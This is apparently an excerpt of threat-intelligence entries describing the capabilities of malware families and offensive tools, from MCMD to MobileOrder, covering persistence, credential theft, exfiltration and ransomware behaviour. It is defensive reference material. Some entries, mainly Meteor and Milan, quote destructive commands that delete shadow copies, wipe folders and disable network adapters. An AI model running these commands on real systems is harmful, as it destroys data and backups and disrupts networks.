MCMD can Base64 encode output strings prior to sending to C2.
MCMD can use Registry Run Keys for persistence.
MCMD can use scheduled tasks for persistence.
MCMD can use HTTPS in communication with C2 web servers.
MCMD can launch a console process (cmd.exe) with redirected standard input and output.
MESSAGETAP has XOR-encrypted and stored contents of SMS messages that matched its target list.
MESSAGETAP checks two files, keyword_parm.txt and parm.txt, for instructions on how to target and save data parsed and extracted from SMS message data from the network traffic. If an SMS message contained either a phone number, IMSI number, or keyword that matched the predefined list, it is saved to a CSV file for later theft by the threat actor.
After checking for the existence of two files, keyword_parm.txt and parm.txt, MESSAGETAP XOR decodes and read the contents of the files.
Once loaded into memory, MESSAGETAP deletes the keyword_parm.txt and parm.txt configuration files from disk.
MESSAGETAP checks for the existence of two configuration files (keyword_parm.txt and parm.txt) and attempts to read the files every 30 seconds.
MESSAGETAP stored targeted SMS messages that matched its target list in CSV files on the compromised system.
MESSAGETAP uses the libpcap library to listen to all traffic and parses network protocols starting with Ethernet and IP layers. It continues parsing protocol layers including SCTP, SCCP, and TCAP and finally extracts SMS message data and routing metadata.
After loading the keyword and phone data files, MESSAGETAP begins monitoring all network connections to and from the victim server.
MURKYTOP has the capability to schedule remote AT jobs.
MURKYTOP has the capability to delete local files.
MURKYTOP has the capability to retrieve information about users on remote hosts.
MURKYTOP has the capability to scan for open ports on hosts in a connected network.
MURKYTOP has the capability to retrieve information about shares on remote hosts.
MURKYTOP has the capability to retrieve information about groups.
MURKYTOP has the capability to identify remote hosts on connected networks.
MURKYTOP has the capability to retrieve information about the OS.
MURKYTOP uses the command-line interface.
MacMa has the ability to record audio.
MacMa can clear possible malware traces such as application logs.
MacMa can collect then exfiltrate files from the compromised system.
MacMa decrypts a downloaded file using AES-128-EBC with a custom delta.
MacMa has used TLS encryption to initialize a custom protocol for C2 communications.
MacMa exfiltrates data from a supplied path over its C2 channel.
MacMa can delete itself from the compromised computer.
MacMa can search for a specific file on the compromised computer and can enumerate files in Desktop, Downloads, and Documents folders.
MacMa has removed the `com.apple.quarantineattribute` from the dropped file, `$TMPDIR/airportpaird`.
MacMa has downloaded additional files, including an exploit for used privilege escalation.
MacMa can dump credentials from the macOS keychain.
MacMa can use Core Graphics Event Taps to intercept user keystrokes from any text input field and saves them to text files. Text input fields include Spotlight, Finder, Safari, Mail, Messages, and other apps that have text fields for passwords.
MacMa installs a `com.apple.softwareupdate.plist` file in the `/LaunchAgents` folder with the `RunAtLoad` value set to `true`. Upon user login, MacMa is executed from `/var/root/.local/softwareupdate` with root privileges. Some variations also include the `LimitLoadToSessionType` key with the value `Aqua`, ensuring the MacMa only runs when there is a logged in GUI user.
MacMa has stored collected files locally before exfiltration.
MacMa has used macOS API functions to perform tasks.
MacMa has used a custom JSON-based protocol for its C&amp;C communications.
MacMa has used TCP port 5633 for C2 Communication.
MacMa can enumerate running processes.
MacMa can manage remote screen sessions.
MacMa has used Apple’s Core Graphic APIs, such as `CGWindowListCreateImageFromArray`, to capture the user's screen and open windows.
MacMa can collect information about a compromised computer, including: Hardware UUID, Mac serial number, macOS version, and disk sizes.
MacMa can collect IP addresses from a compromised host.
MacMa can collect the username from the compromised machine.
MacMa has the capability to create and modify file timestamps.
MacMa can execute supplied shell commands and uses bash scripts to perform additional actions.
MacSpy can record the sounds from microphones on a computer.
MacSpy can steal clipboard contents.
MacSpy deletes any temporary files it creates
MacSpy stores itself in &lt;code&gt;~/Library/.DS_Stores/&lt;/code&gt;
MacSpy captures keystrokes.
MacSpy persists via a Launch Agent.
MacSpy uses Tor for command and control.
MacSpy can capture screenshots of the desktop over multiple monitors.
MacSpy uses HTTP for command and control.
Machete saves the window names.
Machete stores zipped files with profile data from installed web browsers.
Machete's collected data is encrypted with AES before exfiltration.
Machete has used TLS-encrypted FTP to exfiltrate data.
Machete captures audio from the computer’s microphone.
Machete’s collected files are exfiltrated automatically to remote servers.
Machete retrieves the user profile data (e.g., browsers) from Chrome and Firefox browsers.
Machete hijacks the clipboard data by creating an overlapped window that listens to keyboard events.
Machete has used pyobfuscate, zlib compression, and base64 encoding for obfuscation. Machete has also used some visual obfuscation techniques by naming variables as combinations of letters to hinder analysis.
Machete collects stored credentials from several web browsers.
Machete searches the File system for files of interest.
Machete can find, encrypt, and upload files from fixed and removable drives.
Machete’s downloaded data is decrypted using AES.
Machete's collected data is exfiltrated over the same channel used for C2.
Machete has a feature to copy files from every drive onto a removable drive in a hidden folder.
Machete has sent data over HTTP if FTP failed, and has also used a fallback server.
Once a file is uploaded, Machete will delete it from the machine.
Machete uses FTP for Command &amp; Control.
Machete produces file listings in order to search for files to be exfiltrated.
Machete has the capability to exfiltrate stolen data to a hidden folder on a removable drive.
Machete can download additional files for execution on the victim’s machine.
Machete logs keystrokes from the victim’s machine.
Machete stores files and logs in a folder on the local drive.
Machete renamed task names to masquerade as legitimate Google Chrome, Java, Dropbox, Adobe Reader and Python tasks.
Machete renamed payloads to masquerade as legitimate Google Chrome, Java, Dropbox, Adobe Reader and Python executables.
Machete detects the insertion of new devices by listening for the WM_DEVICECHANGE window message.
Machete has scanned and looked for cryptographic keys and certificate file extensions.
Machete has a component to check for running processes to look for web browsers.
Machete is written in Python and is used in conjunction with additional Python scripts.
Machete used the startup folder for persistence.
The different components of Machete are executed by Windows Task Scheduler.
Machete sends stolen data to the C2 server every 10 minutes.
Machete captures screenshots.
Machete has been packed with NSIS.
Machete has used base64 encoding.
Machete has used AES to exfiltrate documents.
Machete collects the hostname of the target computer.
Machete collects the MAC address of the target computer and other network configuration information.
Machete uses the &lt;code&gt;netsh wlan show networks mode=bssid&lt;/code&gt; and &lt;code&gt;netsh wlan show interfaces&lt;/code&gt; commands to list all nearby WiFi networks and connected interfaces.
Machete takes photos from the computer’s web camera.
Machete uses HTTP for Command &amp; Control.
Mafalda can use `AdjustTokenPrivileges()` to elevate privileges.
Mafalda can collect the contents of the `%USERPROFILE%\AppData\Local\Google\Chrome\User Data\LocalState` file.
Mafalda can delete Windows Event logs by invoking the `OpenEventLogW` and `ClearEventLogW` functions.
Mafalda can collect files and information from a compromised host.
Mafalda can search for debugging tools on a compromised host.
Mafalda can decrypt files and data.
Mafalda has been obfuscated and contains encrypted functions.
Mafalda can send network system data and files to its C2 server.
Mafalda can establish an SSH connection from a compromised host to a server.
Mafalda can search for files and directories.
Mafalda can download additional files onto the compromised host.
Mafalda can conduct mouse event logging.
Mafalda can create a named pipe to listen for and send data to a named pipe-based C2 server.
Mafalda can dump password hashes from `LSASS.exe`.
Mafalda can place retrieved files into a destination directory.
Mafalda can create a token for a different user.
Mafalda can manipulate the system registry on a compromised host.
Mafalda can use a variety of API calls.
Mafalda can use raw TCP for C2.
Mafalda can use port-knocking to authenticate itself to another implant called Cryshell to establish an indirect connection to the C2 server.
Mafalda can execute PowerShell commands on a compromised machine.
Mafalda can collect a Chrome encryption key used to protect browser cookies.
Mafalda can enumerate running processes on a machine.
Mafalda can enumerate Registry keys with all subkeys and values.
Mafalda can take a screenshot of the target machine and save it to a file.
Mafalda can search for a variety of security software programs, EDR systems, and malware analysis tools.
Mafalda can create a remote service, let it run once, and then delete it.
Mafalda can encode data using Base64 prior to exfiltration.
Mafalda can encrypt its C2 traffic with RC4.
Mafalda can collect the computer name and enumerate all drives on a compromised host.
Mafalda can use the `GetAdaptersInfo` function to retrieve information about network adapters and the `GetIpNetTable` function to retrieve the IPv4 to physical network address mapping table.
Mafalda can use the &lt;code&gt;GetExtendedTcpTable&lt;/code&gt; function to retrieve information about established TCP connections.
Mafalda can collect the username from a compromised host.
Mafalda can use HTTP for C2.
Mafalda can execute shell commands using `cmd.exe`.
MailSniper can be used to obtain account names from Exchange and Office 365 using the &lt;code&gt;Get-GlobalAddressList&lt;/code&gt; cmdlet.
MailSniper can be used for password spraying against Exchange and Office 365.
MailSniper can be used for searching through email in Exchange and Office 365 environments.
MarkiRAT can use BITS Utility to connect with the C2 server.
MarkiRAT can capture clipboard content.
MarkiRAT can upload data from the victim's machine to the C2 server.
MarkiRAT can exfiltrate locally stored data via its C2.
MarkiRAT can look for files carrying specific extensions such as: .rtf, .doc, .docx, .xls, .xlsx, .ppt, .pptx, .pps, .ppsx, .txt, .gpg, .pkr, .kdbx, .key, and .jpb.
MarkiRAT can download additional files and tools from its C2 server, including through the use of BITSAdmin.
MarkiRAT can capture all keystrokes on a compromised host.
MarkiRAT can store collected data locally in a created .nfo file.
MarkiRAT can masquerade as &lt;code&gt;update.exe&lt;/code&gt; and &lt;code&gt;svehost.exe&lt;/code&gt;; it has also mimicked legitimate Telegram and Chrome files.
MarkiRAT can run the ShellExecuteW API via the Windows Command Shell.
MarkiRAT can gather information from the Keepass password manager.
MarkiRAT can search for different processes on a system.
MarkiRAT can drop its payload into the Startup directory to ensure it automatically runs when the compromised system is started.
MarkiRAT can capture screenshots that are initially saved as ‘scr.jpg’.
MarkiRAT can check for running processes on the victim’s machine to look for Kaspersky and Bitdefender antivirus products.
MarkiRAT can modify the shortcut that launches Telegram by replacing its path with the malicious payload to launch with the legitimate executable.
MarkiRAT can check for the Telegram installation directory by enumerating the files on disk.
MarkiRAT can obtain the computer name from a compromised host.
MarkiRAT can use the &lt;code&gt;GetKeyboardLayout&lt;/code&gt; API to check if a compromised host's keyboard is set to Persian.
MarkiRAT can retrieve the victim’s username.
MarkiRAT can initiate communication over HTTP/HTTPS for its C2 server.
MarkiRAT can utilize cmd.exe to execute commands in a victim's environment.
Matryoshka is capable of providing Meterpreter shell access.
Matryoshka is capable of stealing Outlook passwords.
Matryoshka uses DNS for C2.
Matryoshka uses reflective DLL injection to inject the malicious library and execute the RAT.
Matryoshka is capable of keylogging.
Matryoshka obfuscates API function names using a substitute cipher combined with Base64 encoding.
Matryoshka can establish persistence by adding Registry Run keys.
Matryoshka uses rundll32.exe in a Registry Run key value for execution as part of its persistence mechanism.
Matryoshka can establish persistence by adding a Scheduled Task named "Microsoft Boost Kernel Optimization".
Matryoshka is capable of performing screen captures.
Maze has inserted large blocks of junk code, including some components to decrypt strings and other important information for later in the encryption process.
Maze has disrupted systems by encrypting files on targeted machines, claiming to decrypt files if a ransom payment is made. Maze has used the ChaCha algorithm, based on Salsa20, and an RSA algorithm to encrypt files.
Maze has disabled dynamic analysis and other security tools including IDA debugger, x32dbg, and OllyDbg. It has also disabled Windows Defender's Real-Time Monitoring feature and attempted to disable endpoint protection services.
Maze has forged POST strings with a random choice from a list of possibilities including "forum", "php", "view", etc. while making connection with the C2, hindering detection efforts.
Maze has injected the malware DLL into a target process.
Maze has used the “Wow64RevertWow64FsRedirection” function following attempts to delete the shadow volumes, in order to leave the system in the same state as it was prior to redirection.
Maze has attempted to delete the shadow volumes of infected machines, once before and once after the encryption process.
Maze operators have created scheduled tasks masquerading as "Windows Update Security", "Windows Update Security Patches", and "Google Chrome Security Update" designed to launch the ransomware.
Maze has delivered components for its ransomware attacks using MSI files, some of which have been executed from the command-line using &lt;code&gt;msiexec&lt;/code&gt;.
Maze has used several Windows API functions throughout the encryption process including IsDebuggerPresent, TerminateProcess, Process32FirstW, among others.
Maze has decrypted strings and other important information during the encryption process. Maze also calls certain functions dynamically to hinder analysis.
Maze has gathered all of the running system processes.
Maze has created a file named "startup_vrun.bat" in the Startup folder of a virtual machine to establish persistence.
Maze operators have used VirtualBox and a Windows 7 virtual machine to run the ransomware; the virtual machine's configuration file mapped the shared network drives of the target company, presumably so Maze can encrypt files on the shared drives as well as the local machine.
Maze has created scheduled tasks using name variants such as "Windows Update Security", "Windows Update Security Patches", and "Google Chrome Security Update", to launch Maze at a specific time.
Maze has stopped SQL services to ensure it can encrypt any database.
Maze has checked the language of the infected system using the "GetUSerDefaultUILanguage" function.
Maze has checked the language of the machine with function &lt;code&gt;GetUserDefaultUILanguage&lt;/code&gt; and terminated execution if the language matches with an entry in the predefined list.
Maze has used the "WNetOpenEnumW", "WNetEnumResourceW”, “WNetCloseEnum” and “WNetAddConnection2W” functions to enumerate the network resources on the infected machine.
Maze has issued a shutdown command on a victim machine that, upon reboot, will run the ransomware within a VM.
Maze has communicated to hard-coded IP addresses via HTTP.
The Maze encryption process has used batch scripts with various commands.
Maze has used WMI to attempt to delete the shadow volumes on a machine, and to connect a virtual machine to the network domain of the victim organization's network.
MechaFlounder has the ability to send the compromised user's account name and hostname within a URL to C2.
MechaFlounder has the ability to upload and download files to and from a compromised host.
MechaFlounder has been downloaded as a file named lsass.exe, which matches the legitimate Windows file.
MechaFlounder uses a python-based payload.
MechaFlounder has the ability to use base16 encoded strings in C2.
MechaFlounder has the ability to identify the username and hostname on a compromised host.
MechaFlounder has the ability to use HTTP in communication with C2.
MechaFlounder has the ability to run commands on a compromised host.
MegaCortex can enable &lt;code&gt;SeDebugPrivilege&lt;/code&gt; and adjust token privileges.
MegaCortex has changed user account passwords and logged users off the system.
MegaCortex has used code signing certificates issued to fake companies to bypass security controls.
MegaCortex has used the open-source library, Mbed Crypto, and generated AES keys to carry out the file encryption process.
MegaCortex has used a Base64 key to decode its components.
MegaCortex was used to kill endpoint security processes.
MegaCortex can wipe deleted data from all drives using &lt;code&gt;cipher.exe&lt;/code&gt;.
MegaCortex loads &lt;code&gt;injecthelper.dll&lt;/code&gt; into a newly created &lt;code&gt;rundll32.exe&lt;/code&gt; process.
MegaCortex can parse the available drives and directories to determine which files to encrypt.
MegaCortex has deleted volume shadow copies using &lt;code&gt;vssadmin.exe&lt;/code&gt;.
MegaCortex has added entries to the Registry for ransom contact information.
After escalating privileges, MegaCortex calls &lt;code&gt;TerminateProcess()&lt;/code&gt;, &lt;code&gt;CreateRemoteThread&lt;/code&gt;, and other Win32 APIs.
MegaCortex has used &lt;code&gt;rundll32.exe&lt;/code&gt; to load a DLL for file encryption.
MegaCortex can stop and disable services on the system.
MegaCortex has checked the number of CPUs in the system to avoid being run in a sandbox or emulator.
MegaCortex has used &lt;code&gt;.cmd&lt;/code&gt; scripts on the victim's system.
Melcoz has been distributed through an AutoIt loader script.
Melcoz can monitor the victim's browser for online banking sessions and display an overlay window to manipulate the session in the background.
Melcoz can monitor content saved to the clipboard.
Melcoz has the ability to steal credentials from web browsers.
Melcoz can use DLL hijacking to bypass security controls.
Melcoz has the ability to download additional files to a compromised host.
Melcoz has gained execution through victims opening malicious links.
Melcoz can use MSI files with embedded VBScript for execution.
Melcoz has been packed with VMProtect and Themida.
Melcoz has been spread through malicious links embedded in e-mails.
Melcoz can monitor the clipboard for cryptocurrency addresses and change the intended address to one controlled by the adversary.
Melcoz can use VBS scripts to execute malicious DLLs.
Metamorfo can enumerate all windows on the victim’s machine.
Metamorfo's C2 communication has been encrypted using OpenSSL.
Metamorfo has automatically collected mouse clicks, continuous screenshots on the machine, and set timers to collect the contents of the clipboard and website browsing.
Metamorfo has a function to hijack data from the clipboard by monitoring the contents of the clipboard and replacing the cryptocurrency wallet with the attacker's.
Metamorfo has digitally signed executables using AVAST Software certificates.
Metamorfo has side-loaded its malicious DLL file.
Metamorfo has used YouTube to store and hide C&amp;C server domains.
Upon execution, Metamorfo has unzipped itself after being downloaded to the system and has performed string decryption.
Metamorfo has a function to kill processes associated with defenses and can prevent certain processes from launching.
Metamorfo has injected a malicious DLL into the Windows Media Player process (wmplayer.exe).
Metamorfo has encrypted payloads and strings.
Metamorfo can send the data it collects to the C2 server.
Metamorfo has deleted itself from the system after execution.
Metamorfo has searched the Program Files directories for specific folders and has searched for strings related to its mutexes.
Metamorfo has displayed fake forms on top of banking sites to intercept credentials from victims.
Metamorfo has hidden its GUI using the ShowWindow() WINAPI call.
Metamorfo has a command to delete a Registry key it uses, &lt;code&gt;\Software\Microsoft\Internet Explorer\notes&lt;/code&gt;.
Metamorfo has used MSI files to download additional files to execute.
Metamorfo includes payloads written in JavaScript.
Metamorfo has a command to launch a keylogger and capture keystrokes on the victim’s machine.
Metamorfo requires the user to double-click the executable to run the malicious HTA file or to download a malicious installer.
Metamorfo has disguised an MSI file as the Adobe Acrobat Reader Installer and has masqueraded payloads as OneDrive, WhatsApp, or Spotify, for example.
Metamorfo has written process names to the Registry, disabled IE browser features, deleted Registry keys, and changed the ExtendedUIHoverTime key.
Metamorfo has used mshta.exe to execute a HTA payload.
Metamorfo has used MsiExec.exe to automatically execute files.
Metamorfo has used native WINAPI calls.
Metamorfo has used raw TCP for C2.
Metamorfo has communicated with hosts over raw TCP on port 9999.
Metamorfo has downloaded a zip file for execution on the system.
Metamorfo has performed process name checks and has monitored applications.
Metamorfo has configured persistence to the Registry key &lt;code&gt;HKCU\Software\Microsoft\Windows\CurrentVersion\Run, Spotify =% APPDATA%\Spotify\Spotify.exe&lt;/code&gt; and used .LNK files in the startup folder to achieve persistence.
Metamorfo can collect screenshots of the victim’s machine.
Metamorfo collects a list of installed antivirus software from the victim’s system.
Metamorfo had used AutoIt to load and execute the DLL payload.
Metamorfo has searched the compromised system for banking applications.
Metamorfo has used VMProtect to pack and protect files.
Metamorfo has been delivered to victims via emails with malicious HTML attachments.
Metamorfo has encrypted C2 commands with AES-256.
Metamorfo has collected the hostname and operating system version from the compromised host.
Metamorfo has collected the username from the victim's machine.
Metamorfo uses JavaScript to get the system time.
Metamorfo has a function that can watch the contents of the system clipboard for valid bitcoin addresses, which it then overwrites with the attacker's address.
Metamorfo has embedded a "vmdetect.exe" executable to identify virtual machines at the beginning of execution.
Metamorfo has used VBS code on victims’ systems.
Metamorfo has used HTTP for C2.
Metamorfo has used &lt;code&gt;cmd.exe /c&lt;/code&gt; to execute files.
Meteor has the ability to change the password of local users on compromised hosts and can log off users.
Meteor can use Wevtutil to remove Security, System and Application Event Viewer logs.
Meteor can fill a victim's files and directories with zero-bytes in replacement of real content before deleting them.
Meteor can attempt to uninstall Kaspersky Antivirus or remove the Kaspersky license; it can also add all files and folders related to the attack to the Windows Defender exclusion list.
Meteor will delete the folder containing malicious scripts if it detects the hostname as `PIS-APP`, `PIS-MOB`, `WSUSPROXY`, or `PIS-DB`.
Meteor can use group policy to push a scheduled task from the AD to all network machines.
Meteor can hide its console window upon execution to decrease its visibility to a victim.
Meteor has the ability to download additional files for execution on the victim's machine.
Meteor can use `bcdedit` to delete different boot identifiers on a compromised host; it can also use `vssadmin.exe delete shadows /all /quiet` and `C:\\Windows\\system32\\wbem\\wmic.exe shadowcopy delete`.
Meteor can change both the desktop wallpaper and the lock screen image to a custom image.
Meteor has been disguised as the Windows Power Efficiency Diagnostics report tool.
Meteor can use `WinAPI` to remove a victim machine from an Active Directory domain.
Meteor can use PowerShell commands to disable the network adapters on a victim machines.
Meteor can check if a specific process is running, such as Kaspersky's `avp.exe`.
Meteor execution begins from a scheduled task named `Microsoft\Windows\Power Efficiency Diagnostics\AnalyzeAll` and it creates a separate scheduled task called `mstask` to run the wiper only once at 23:55:00.
Meteor has the ability to search for Kaspersky Antivirus on a victim's machine.
Meteor can disconnect all network adapters on a compromised host using `powershell -Command "Get-WmiObject -class Win32_NetworkAdapter | ForEach { If ($.NetEnabled) { $.Disable() } }" &gt; NUL`.
Meteor has the ability to discover the hostname of a compromised host.
Meteor can run `set.bat`, `update.bat`, `cache.bat`, `bcd.bat`, `msrun.bat`, and similar scripts.
Meteor can use `wmic.exe` as part of its effort to delete shadow copies.
Micropsia creates a RAR archive based on collected files on the victim's machine.
Micropsia can perform microphone recording.
Micropsia executes an RAR tool to recursively archive files based on a predefined list of file extensions (*.xls, *.xlsx, *.csv, *.odt, *.doc, *.docx, *.ppt, *.pptx, *.pdf, *.mdb, *.accdb, *.accde, *.txt).
Micropsia obfuscates the configuration with a custom Base64 and XOR.
Micropsia can perform a recursive directory listing for all volume drives available on the victim's machine and can also fetch specific files by their paths.
Micropsia creates a new hidden directory to store all components' outputs in a dedicated sub-folder for each.
Micropsia can download and execute an executable from the C2 server.
Micropsia has keylogging capabilities.
Micropsia takes screenshots every 90 seconds by calling the Gdi32.BitBlt API.
Micropsia searches for anti-virus software and firewall products installed on the victim’s machine using WMI.
Micropsia creates a shortcut to maintain persistence.
Micropsia gathers the hostname and OS version from the victim’s machine.
Micropsia collects the username from the victim’s machine.
Micropsia uses HTTP and HTTPS for C2 network communications.
Micropsia creates a command-line shell using cmd.exe.
Micropsia searches for anti-virus software and firewall products installed on the victim’s machine using WMI.
Milan can use a COM component to generate scheduled tasks.
Milan has the ability to use DNS for C2 communications.
Milan can upload files from a compromised host.
Milan can use hardcoded domains as an input for domain generation algorithms.
Milan has used an executable named `companycatalog.exe.config` to appear benign.
Milan can encode files containing information about the targeted system.
Milan can delete files via `C:\Windows\system32\cmd.exe /c ping 1.1.1.1 -n 1 -w 3000 &gt; Nul &amp; rmdir /s /q`.
Milan has received files from C2 and stored them in log folders beginning with the character sequence `a9850d2f`.
Milan has run `C:\Windows\system32\cmd.exe /c cmd /c dir c:\users\ /s 2&gt;&amp;1` to discover local accounts.
Milan has saved files prior to upload from a compromised host to folders beginning with the characters `a9850d2f`.
Milan has used an executable named `companycatalogue` to appear benign.
Milan can use the API `DnsQuery_A` for DNS resolution.
Milan can use a custom protocol tunneled through DNS or HTTP.
Milan can query `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography MachineGuid` to retrieve the machine GUID.
Milan can establish persistence on a targeted host with scheduled tasks.
Milan can enumerate the targeted machine's name and GUID.
Milan can run `C:\Windows\system32\cmd.exe /c cmd /c ipconfig /all 2&gt;&amp;1` to discover network settings.
Milan can identify users registered to a targeted machine.
Milan can use HTTPS for communication with C2.
Milan can use `cmd.exe` for discovery actions on a targeted system.
MimiPenguin can use the `&lt;PID&gt;/maps` and `&lt;PID&gt;/mem` file to search for regex patterns and dump the process memory.
The Mimikatz credential dumper has been extended to include Skeleton Key domain controller authentication bypass functionality. The &lt;code&gt;LSADUMP::ChangeNTLM&lt;/code&gt; and &lt;code&gt;LSADUMP::SetNTLM&lt;/code&gt; modules can also manipulate the password hash of an account without knowing the clear text value.
Mimikatz performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from the credential vault and DPAPI.
Mimikatz performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from DPAPI.
Mimikatz performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from DCSync/NetSync.
Mimikatz's kerberos module can create golden tickets.
Mimikatz performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from the LSA.
Mimikatz performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from the LSASS Memory.
Mimikatz's &lt;code&gt;SEKURLSA::Pth&lt;/code&gt; module can impersonate a user, with only a password hash, to execute arbitrary commands.
Mimikatz’s &lt;code&gt;LSADUMP::DCSync&lt;/code&gt; and &lt;code&gt;KERBEROS::PTT&lt;/code&gt; modules implement the three steps required to extract the krbtgt account hash and create/use Kerberos tickets.
Mimikatz's &lt;code&gt;CRYPTO::Extract&lt;/code&gt; module can extract keys by interacting with Windows cryptographic application programming interface (API) functions.
Mimikatz’s &lt;code&gt;LSADUMP::DCShadow&lt;/code&gt; module can be used to make AD updates by temporarily setting a computer to be a DC.
Mimikatz's &lt;code&gt;MISC::AddSid&lt;/code&gt; module can append any SID or user/group account to a user's SID-History. Mimikatz also utilizes SID-History Injection to expand the scope of other components such as generated Kerberos Golden Tickets and DCSync beyond a single domain.
Mimikatz performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from the SAM table.
The Mimikatz credential dumper contains an implementation of an SSP.
Mimikatz's kerberos module can create silver tickets.
Mimikatz's `CRYPTO` module can create and export various types of authentication certificates.
Mimikatz contains functionality to acquire credentials from the Windows Credential Manager.
Miner-C copies itself into the public folder of Network Attached Storage (NAS) devices and infects new victims who open the file.
Some MiniDuke components use Twitter to initially obtain the address of a C2 server or as a backup if no hard-coded C2 server responds.
MiniDuke can use DGA to generate new Twitter URLs for C2.
MiniDuke uses Google Search to identify C2 servers if its primary C2 method via Twitter is not working.
MiniDuke can enumerate local drives.
MiniDuke can download additional encrypted backdoors onto the victim via GIF files.
MiniDuke can can use a named pipe to forward communications from one compromised machine with internet access to other compromised machines.
MiniDuke can use control flow flattening to obscure code.
MiniDuke can gather the hostname on a compromised machine.
MiniDuke uses HTTP and HTTPS for command and control.
MirageFox is likely loaded via DLL hijacking into a legitimate McAfee binary.
MirageFox has a function for decrypting data containing C2 configuration information.
MirageFox can collect CPU and architecture information from the victim’s machine.
MirageFox can gather the username from the victim’s machine.
MirageFox has the capability to execute commands using cmd.exe.
Mis-Type has created registry keys for persistence, including `HKCU\Software\bkfouerioyou`, `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{6afa8072-b2b1-31a8-b5c1-{Unique Identifier}`, and `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{3BF41072-B2B1-31A8-B5C1-{Unique Identifier}`.
Mis-Type has collected files and data from a compromised host.
Mis-Type has transmitted collected files and data to its C2 server.
Mis-Type first attempts to use a Base64-encoded network protocol over a raw TCP socket for C2, and if that method fails, falls back to a secondary HTTP-based protocol to communicate to an alternate C2 server.
Mis-Type has downloaded additional malware and files onto a compromised host.
Mis-Type may create a file containing the results of the command &lt;code&gt;cmd.exe /c net user {Username}&lt;/code&gt;.
Mis-Type may create a temporary user on the system named `Lost_{Unique Identifier}`.
Mis-Type has temporarily stored collected information to the files `“%AppData%\{Unique Identifier}\HOSTRURKLSR”` and `“%AppData%\{Unique Identifier}\NEWERSSEMP”`.
Mis-Type saves itself as a file named `msdtc.exe`, which is also the name of the legitimate Microsoft Distributed Transaction Coordinator service binary.
Mis-Type has used Windows API calls, including `NetUserAdd` and `NetUserDel`.
Mis-Type network traffic can communicate over a raw socket.
Mis-Type has been injected directly into a running process, including `explorer.exe`.
Mis-Type uses Base64 encoding for C2 traffic.
The initial beacon packet for Mis-Type contains the operating system version and file system of the victim.
Mis-Type may create a file containing the results of the command &lt;code&gt;cmd.exe /c ipconfig /all&lt;/code&gt;.
Mis-Type runs tests to determine the privilege level of the compromised user.
Mis-Type network traffic can communicate over HTTP.
Mis-Type has used `cmd.exe` to run commands on a compromised host.
Misdat has created registry keys for persistence, including `HKCU\Software\dnimtsoleht\StubPath`, `HKCU\Software\snimtsOleht\StubPath`, `HKCU\Software\Backtsaleht\StubPath`, `HKLM\SOFTWARE\Microsoft\Active Setup\Installed. Components\{3bf41072-b2b1-21c8-b5c1-bd56d32fbda7}`, and `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{3ef41072-a2f1-21c8-c5c1-70c2c3bc7905}`.
Misdat is capable of deleting Registry keys used for persistence.
Misdat has collected files and data from a compromised host.
Misdat has uploaded files and data to its C2 servers.
Misdat is capable of deleting the backdoor file.
Misdat is capable of running commands to obtain a list of files and directories, as well as enumerating logical drives.
Misdat is capable of downloading files from the C2.
Misdat saves itself as a file named `msdtc.exe`, which is also the name of the legitimate Microsoft Distributed Transaction Coordinator service binary.
Misdat has used Windows APIs, including `ExitWindowsEx` and `GetKeyboardType`.
Misdat network traffic communicates over a raw socket.
Misdat was typically packed using UPX.
Misdat network traffic is Base64-encoded plaintext.
The initial beacon packet for Misdat contains the operating system version of the victim.
Misdat has attempted to detect if a compromised host had a Japanese keyboard via the Windows API call `GetKeyboardType`.
Many Misdat samples were programmed using Borland Delphi, which will mangle the default PE compile timestamp of a file.
Misdat is capable of providing shell functionality to the attacker to execute commands.
Mispadu contains a copy of the OpenSSL library to encrypt C2 traffic.
Mispadu utilizes malicious Google Chrome browser extensions to steal financial data.
Mispadu can monitor browser activity for online banking actions and display full-screen overlay images to block user access to the intended site or present additional data fields.
Mispadu has the ability to capture and replace Bitcoin wallet data in the clipboard on a compromised host.
Mispadu has obtained credentials from mail clients via NirSoft MailPassView.
Mispadu can steal credentials from Google Chrome.
Mispadu decrypts its encrypted configuration files prior to execution.
Mispadu uses a custom algorithm to obfuscate its internal strings and uses hardcoded keys.

Mispadu also uses encoded configuration files and has encoded payloads using Base64.
Mispadu can sends the collected financial data to the C2 server.
Mispadu searches for various filesystem paths to determine what banking applications are installed on the victim’s machine.
Mispadu can monitor browser activity for online banking actions and display full-screen overlay images to block user access to the intended site or present additional data fields.
Mispadu can log keystrokes on the victim's machine.
Mispadu has relied on users to execute malicious files in order to gain execution on victim machines.
Mispadu has been installed via MSI installer.
Mispadu has used a variety of Windows API calls, including ShellExecute and WriteProcessMemory.
Mispadu can enumerate the running processes on a compromised host.
Mispadu's binary is injected into memory via `WriteProcessMemory`.
Mispadu creates a link in the startup folder for persistence. Mispadu adds persistence via the registry key `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.
Mispadu uses RunDLL32 for execution via its injector DLL.
Mispadu has the ability to capture screenshots on compromised hosts.
Mispadu can list installed security products in the victim’s environment.
Mispadu has been spread via malicious links embedded in emails.
Mispadu can run checks to verify if it is running within a virtualized environments including Hyper-V, VirtualBox or VMWare and will terminate execution if the computer name is “JOHN-PC.”
Mispadu collects the OS version, computer name, and language ID.
Mispadu checks and will terminate execution if the compromised system’s language ID is not Spanish or Portuguese.
Mispadu’s dropper uses VBS files to install payloads and perform execution.
Mivast has the capability to download and execute .exe files.
Mivast creates the following Registry entry: &lt;code&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Micromedia&lt;/code&gt;.
Mivast has the capability to gather NTLM password information.
Mivast has the capability to open a remote shell and run basic commands.
MobileOrder has a command to upload to its C2 server victim browser bookmarks.
MobileOrder exfiltrates data collected from the victim mobile device.
MobileOrder exfiltrates data to its C2 server over the same protocol as C2 communications.
